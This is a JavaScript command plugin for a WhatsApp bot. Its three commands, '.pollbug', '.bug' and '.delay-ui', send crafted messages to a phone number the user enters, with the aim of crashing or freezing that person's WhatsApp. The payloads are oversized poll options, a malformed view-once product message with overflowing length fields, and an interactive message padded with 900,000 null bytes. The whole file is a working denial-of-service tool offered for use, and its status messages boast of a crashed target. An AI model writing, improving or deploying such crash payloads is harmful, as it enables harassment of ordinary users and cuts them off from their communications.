const { cmd } = require('../command');
const crypto = require('crypto');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys'); // adjust if needed

// ==================== POLL CRASH (FIXED) ====================
cmd({
    pattern: "pollbug",
    desc: "Send poll crash message to target",
    category: "tools",
    filename: __filename
},
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    try {
        if (!args[0]) {
            return reply(`❌ *Missing target number!*\n\nUsage: .pollbug 947XXXXXXXXX\nExample: .pollbug 94712345678`);
        }

        const target = args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
        await reply(`🔥 *POLL CRASH INITIATED* 🔥\nTarget: ${target}\nStatus: Injecting...`);

        // Ensure chat exists (by sending an invisible ping)
        await conn.presenceSubscribe(target);
        
        await xlmnop(conn, target);
        await reply(`✅ *POLL CRASH COMPLETED* ✅\nTarget: ${target}\nStatus: Crashed!`);
    } catch (error) {
        console.error(error);
        reply(`❌ Error: ${error.message}`);
    }
});

// Fixed poll crash function
async function xlmnop(conn, target) {
    const pollMessage = {
        pollCreationMessage: {
            name: "⚠️ SYSTEM ERROR ⚠️",
            options: [
                { optionName: "⛔" + "0".repeat(50000) },  // overflow attempt
                { optionName: "💀" + "0".repeat(50000) }
            ],
            selectableOptionsCount: 1,
            pollType: "QUIZ",
            correctAnswer: { optionName: "💀" + "0".repeat(50000) },
            contextInfo: { isGroupStatus: false }
        }
    };
    const msg = generateWAMessageFromContent(target, pollMessage, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== VIEW‑ONCE CRASH (FIXED) ====================
cmd({
    pattern: "bug",
    desc: "Send viewOnce crash message to target",
    category: "tools",
    filename: __filename
},
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    try {
        if (!args[0]) {
            return reply(`❌ *Missing target number!*\n\nUsage: .bug 947XXXXXXXXX\nExample: .bug 94712345678`);
        }

        const target = args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
        await reply(`🔥 *VIEWONCE CRASH INITIATED* 🔥\nTarget: ${target}\nStatus: Injecting...`);

        await conn.presenceSubscribe(target);
        await ttaas(conn, target);
        await reply(`✅ *VIEWONCE CRASH COMPLETED* ✅\nTarget: ${target}\nStatus: Crashed!`);
    } catch (error) {
        console.error(error);
        reply(`❌ Error: ${error.message}`);
    }
});

async function ttaas(conn, target) {
    const imageMessage = {
        "url": "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        "mimetype": "image/jpeg",
        "fileSha256": "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        "fileLength": "93217",
        "caption": "7eppsynC",
        "height": 1080,
        "width": 1080,
        "mediaKey": "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        "fileEncSha256": "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        "directPath": "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        "mediaKeyTimestamp": "1778142659",
        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAgMBAQAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgICAQMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        "contextInfo": {
            "pairedMediaType": "NOT_PAIRED_MEDIA",
            "isQuestion": true,
            "isGroupStatus": true
        },
        "scansSidecar": "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        "firstScanLength": 9999999999999999999,
        "scanLengths": [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        "midQualityFileSha256": "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage,
                        productId: "449756950375071",
                        title: "7eppsynC",
                        description: "",
                        priceAmount1000: { low: 999, high: 0, unsigned: false },
                        url: "wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999",
                        salePriceAmount1000: { low: 9999999, high: 999999999, unsigned: true }
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== NEW: INVISIBLE DELAY CRASH (.delay-ui) ====================
async function CrashMemek(conn, number) {
    await conn.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "VnF",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "`ꦻ⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ោ࣯࣯៝" + "\0".repeat(900000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: number } });
}

cmd({
    pattern: "delay-ui",
    desc: "Send invisible delay crash with progress bar",
    category: "tools",
    filename: __filename
},
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    try {
        if (!args[0]) {
            return reply(`❌ *Missing target number!*\n\nUsage: .delay-ui 947XXXXXXXXX\nExample: .delay-ui 94712345678`);
        }

        const target = args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
        let progressMsg = await reply(`🌑 *INVISIBLE DELAY CRASH* 🌑\nTarget: ${target}\n\n[░░░░░░░░░░] 0%`);

        // Simulate progress bar updates
        const steps = [10, 25, 40, 60, 75, 90, 99];
        for (const percent of steps) {
            await new Promise(resolve => setTimeout(resolve, 800));
            const bars = Math.floor(percent / 10);
            const bar = '█'.repeat(bars) + '░'.repeat(10 - bars);
            await conn.relayMessage(from, {
                editMessage: {
                    text: `🌑 *INVISIBLE DELAY CRASH* 🌑\nTarget: ${target}\n\n[${bar}] ${percent}%`,
                    message: progressMsg.key
                }
            }, {});
        }

        // Final 100% + send the actual crash
        await conn.relayMessage(from, {
            editMessage: {
                text: `🌑 *INVISIBLE DELAY CRASH* 🌑\nTarget: ${target}\n\n[██████████] 100%\n⚡ Injecting invisible payload... ⚡`,
                message: progressMsg.key
            }
        }, {});

        await CrashMemek(conn, target);

        // Scrappy "Send Done" message
        await conn.relayMessage(from, {
            editMessage: {
                text: `✅ *SEND DONE* ✅\n\n┌─────────────────┐\n│ ✨ CRASH DELIVERED ✨ │\n│   💀 TARGET HIT 💀   │\n│   📡 INVISIBLE MODE  │\n└─────────────────┘\n\n> _The target will now experience_ \n> _unexpected delays & freezes_`,
                message: progressMsg.key
            }
        }, {});
    } catch (error) {
        console.error(error);
        reply(`❌ Error: ${error.message}`);
    }
});
